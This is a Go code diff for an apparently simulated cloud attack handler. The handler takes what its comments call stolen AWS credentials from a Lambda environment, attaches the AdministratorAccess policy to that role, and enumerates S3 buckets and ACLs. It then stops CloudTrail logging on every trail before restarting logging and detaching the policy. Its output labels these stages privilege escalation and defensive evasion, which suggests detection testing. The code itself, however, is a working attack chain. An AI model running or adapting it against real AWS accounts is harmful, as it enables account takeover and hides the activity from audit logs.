@@ -52,17 +52,10 @@ func parseAwsCredentials(environData string) (string, string, string) {
 	return awsAccessKeyID, awsSecretAccessKey, awsSessionToken
 }
 
-func assumeRole(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken string) string {
-	cfg := &aws.Config{
-		Region:      aws.String(region),
-		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
-	}
-
-	svc := sts.New(session.New(), cfg)
-
+func assumeRole(sts_svc *sts.STS) string {
 	params := &sts.GetCallerIdentityInput{}
 
-	resp, err := svc.GetCallerIdentity(params)
+	resp, err := sts_svc.GetCallerIdentity(params)
 	if err != nil {
 		log.Println(err)
 		return ""
@@ -71,13 +64,7 @@ func assumeRole(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken stri
 	return *resp.Arn
 }
 
-func attachAdminPolicyToRole(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, roleName string) {
-	cfg := &aws.Config{
-		Region:      aws.String(region),
-		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
-	}
-
-	svc := iam.New(session.New(), cfg)
+func attachAdminPolicyToRole(iam_svc *iam.IAM, roleName string) {
 
 	arn := "arn:aws:iam::aws:policy/AdministratorAccess"
 	params := &iam.AttachRolePolicyInput{
@@ -85,7 +72,22 @@ func attachAdminPolicyToRole(region, awsAccessKeyID, awsSecretAccessKey, awsSess
 		RoleName:  aws.String(roleName),
 	}
 
-	_, err := svc.AttachRolePolicy(params)
+	_, err := iam_svc.AttachRolePolicy(params)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+}
+
+func detachAdminPolicyToRole(iam_svc *iam.IAM, roleName string) {
+
+	policyArn := "arn:aws:iam::aws:policy/AdministratorAccess"
+	params := &iam.DetachRolePolicyInput{
+		PolicyArn: aws.String(policyArn),
+		RoleName:  aws.String(roleName),
+	}
+
+	_, err := iam_svc.DetachRolePolicy(params)
 	if err != nil {
 		log.Println(err)
 		return
@@ -103,7 +105,7 @@ func listS3Buckets(s3_svc *s3.S3) []*s3.Bucket {
 	return resp.Buckets
 }
 
-func checkBucketConfig(s3Svc *s3.S3, bucketName string) (string, string) {
+func checkBucketConfig(s3_svc *s3.S3, bucketName string) (string, string) {
 	loggingStatus := "Disabled"
 	aclStatus := "Unknown"
 
@@ -111,7 +113,7 @@ func checkBucketConfig(s3Svc *s3.S3, bucketName string) (string, string) {
 	params := &s3.GetBucketLoggingInput{
 		Bucket: aws.String(bucketName),
 	}
-	_, err := s3Svc.GetBucketLogging(params)
+	_, err := s3_svc.GetBucketLogging(params)
 	if err != nil {
 		if aerr, ok := err.(awserr.Error); ok && aerr.Code() == "NoSuchBucket" {
 			loggingStatus = "Bucket not found"
@@ -126,7 +128,7 @@ func checkBucketConfig(s3Svc *s3.S3, bucketName string) (string, string) {
 	params2 := &s3.GetBucketAclInput{
 		Bucket: aws.String(bucketName),
 	}
-	_, err2 := s3Svc.GetBucketAcl(params2)
+	_, err2 := s3_svc.GetBucketAcl(params2)
 	if err2 != nil {
 		if aerr, ok := err2.(awserr.Error); ok && aerr.Code() == "NoSuchBucket" {
 			aclStatus = "Bucket not found"
@@ -140,19 +142,13 @@ func checkBucketConfig(s3Svc *s3.S3, bucketName string) (string, string) {
 	return loggingStatus, aclStatus
 }
 
-func stopCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, trailName string) bool {
-	cfg := &aws.Config{
-		Region:      aws.String(region),
-		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
-	}
-
-	svc := cloudtrail.New(session.New(), cfg)
+func stopCloudTrailLogging(ct_svc *cloudtrail.CloudTrail, trailName string) bool {
 
 	params := &cloudtrail.DescribeTrailsInput{
 		TrailNameList: []*string{aws.String(trailName)},
 	}
 
-	resp, err := svc.DescribeTrails(params)
+	resp, err := ct_svc.DescribeTrails(params)
 	if err != nil {
 		log.Println(err)
 		return false
@@ -165,7 +161,7 @@ func stopCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessio
 				Name: &trailName,
 			}
 
-			_, err := svc.StopLogging(params)
+			_, err := ct_svc.StopLogging(params)
 			if err != nil {
 				log.Println(err)
 				return false
@@ -182,19 +178,13 @@ func stopCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessio
 	return false
 }
 
-func startCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, trailName string) bool {
-	cfg := &aws.Config{
-		Region:      aws.String(region),
-		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
-	}
-
-	svc := cloudtrail.New(session.New(), cfg)
+func startCloudTrailLogging(ct_svc *cloudtrail.CloudTrail, trailName string) bool {
 
 	params := &cloudtrail.StartLoggingInput{
 		Name: &trailName,
 	}
 
-	_, err := svc.StartLogging(params)
+	_, err := ct_svc.StartLogging(params)
 	if err != nil {
 		log.Println(err)
 		return false
@@ -204,12 +194,26 @@ func startCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessi
 	return true
 }
 
+// GetCloudTrailTrails returns a list of CloudTrail trails in the specified AWS region.
+func GetCloudTrailTrails(region string, ct_svc *cloudtrail.CloudTrail) ([]*cloudtrail.Trail, error) {
+
+    // Call DescribeTrails API to get the list of trails
+    resp, err := ct_svc.DescribeTrails(&cloudtrail.DescribeTrailsInput{})
+    if err != nil {
+        return nil, err
+    }
+
+    // Return the list of trails
+    return resp.TrailList, nil
+}
+
 // Struct for a simple JSON response
 type jsonResponse struct {
 	Message string `json:"message"`
 }
 
 func serverlesspathHandler(w http.ResponseWriter, r *http.Request) {
+	// Gather AWS Region
 	region := os.Getenv("REGION")
 	// Log the request and Log the AGW_URL environment variable value
 	log.Printf("Received request for /serverlesspath from %s", r.RemoteAddr)
@@ -221,28 +225,33 @@ func serverlesspathHandler(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		log.Fatal(err)
 	}
-
+	//Set the credentials i am going after
 	awsAccessKeyID, awsSecretAccessKey, awsSessionToken := parseAwsCredentials(environData)
 
+	//Set stolen credentails
 	stolen_cfg := &aws.Config{
 		Region:      aws.String(region),
 		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
 	}
 
+	//set up client services for AWS with stolen creds
 	s3_svc := s3.New(session.New(), stolen_cfg)
-
-	// Assume the IAM Role and provide back the ARN and Role Name
-	callerIdentity := assumeRole(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken)
+	sts_svc := sts.New(session.New(), stolen_cfg)
+	iam_svc := iam.New(session.New(), stolen_cfg)
+	ct_svc := cloudtrail.New(session.New(), stolen_cfg)
+	
+	// 1. Assume the IAM Role and provide back the ARN and Role Name
+	callerIdentity := assumeRole(sts_svc)
 	fmt.Printf("AssumedRoleARN: %s\n", callerIdentity)
 	segment := strings.Split(callerIdentity, "/")
 	roleName := segment[len(segment)-2]
 	fmt.Printf("VulnerableLambdaRoleName: %s\n", roleName)
 
-	// Permissions Elevated to perform more actions
-	attachAdminPolicyToRole(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, roleName)
+	// 2. Permissions Elevated to Admin to perform more actions
+	attachAdminPolicyToRole(iam_svc, roleName)
 	time.Sleep(8 * time.Second)
 
-	// Enumerate S3 Services and Configurations
+	// Enumerate S3 Services and Configurations here i look for 3 buckets to trigger enumeration event
 	buckets := listS3Buckets(s3_svc)
 	bucketCount := 0
 
@@ -256,34 +265,38 @@ func serverlesspathHandler(w http.ResponseWriter, r *http.Request) {
 		fmt.Println()
 
 		bucketCount++
-		if bucketCount >= 5 {
+		if bucketCount >= 3 {
 			break
 		}
 	}
 
-	// Vision on model for next steps of workflow
-	trailName := os.Getenv("CT_NAME")
-	stopCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, trailName)
-	time.Sleep(5 * time.Second)
-	startCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, trailName)
+	// 3. Get a list of all CloudTrail Trails
+	trails, err := GetCloudTrailTrails(region, ct_svc)
+    if err != nil {
+        log.Fatalf("Error getting CloudTrail trails: %v", err)
+    }
+	// create an array if multiple trails exist
+	var disabled_trails_list []string
 
-	cfg := &aws.Config{
-		Region:      aws.String(region),
-		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
+	// 4. loop through trails returned and stop logging if in same region.
+	for _, trail := range trails {
+		trailName := *trail.Name
+		success := stopCloudTrailLogging(ct_svc, trailName)
+		if success {
+			fmt.Printf("Stopped CloudTrail logging for '%s'.\n", trailName)
+			disabled_trails_list = append(disabled_trails_list, *trail.Name)
+		} else {
+			fmt.Printf("Failed to stop CloudTrail logging for '%s'.\n", trailName)
+		}
+		// wait a few seconds and re-enable CT logging
+		time.Sleep(5 * time.Second)
+		startCloudTrailLogging(ct_svc, trailName)
 	}
-	iamSvc := iam.New(session.New(), cfg)
-
-	policyArn := "arn:aws:iam::aws:policy/AdministratorAccess"
-	params := &iam.DetachRolePolicyInput{
-		PolicyArn: aws.String(policyArn),
-		RoleName:  aws.String(roleName),
-	}
-
-	_, err = iamSvc.DetachRolePolicy(params)
-	if err != nil {
-		log.Println(err)
-	}
-	// Create a JSON response
+	// 5. Detach the admin policy so can be executed again
+	detachAdminPolicyToRole(iam_svc, roleName)
+	
+	// Create a JSON response for Frontend
+	disabledTrailsStr := strings.Join(disabled_trails_list, ", ")
 	response := struct {
 		EndpointURLTargeted   string `json:"EndpointURLTargeted"`
 		AssumedLambdaRoleName string `json:"AssumedLambdaRoleName"`
@@ -297,7 +310,7 @@ func serverlesspathHandler(w http.ResponseWriter, r *http.Request) {
 		AssumedRoleARN:        callerIdentity,
 		EscalatePrivileges:    "attaching: arn:aws:iam::aws:policy/AdministratorAccess",
 		ServiceEnumeration:    "Enumerating through S3 Resources checking ACL Configurations",
-		DefensiveEvasion:      "Temporarily impairing CloudTrail Logging on: " + trailName,
+		DefensiveEvasion:      "Temporarily impairing CloudTrail Logging on: " + disabledTrailsStr,
 	}
 	// Set content type to JSON before writing the body
 	w.Header().Set("Content-Type", "application/json")
